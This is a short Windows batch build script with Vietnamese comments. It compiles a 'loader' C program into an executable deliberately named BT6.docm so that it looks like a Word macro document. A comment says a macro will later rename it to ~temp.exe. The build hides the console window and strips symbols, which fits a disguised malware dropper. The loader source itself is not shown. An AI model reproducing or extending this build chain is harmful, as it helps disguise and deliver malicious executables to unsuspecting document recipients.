@echo off
REM Build loader thành BT6.docm (sẽ đổi tên thành ~temp.exe bởi macro)
REM Cần MinGW hoặc Visual Studio

where gcc >nul 2>&1
if %errorlevel% equ 0 (
    echo [+] Using MinGW GCC
    goto :build_gcc
)

where cl >nul 2>&1
if %errorlevel% equ 0 (
    echo [+] Using Visual Studio
    goto :build_msvc
)

:build_gcc
echo [*] Compiling with GCC...
gcc -O2 ^
    -s ^
    src\loader.c ^
    -o BT6.docm ^
    -lbcrypt ^
    -mwindows

if %errorlevel% neq 0 (
    echo [-] Compilation failed!
    pause
    exit /b 1
)

del *.obj 2>nul
pause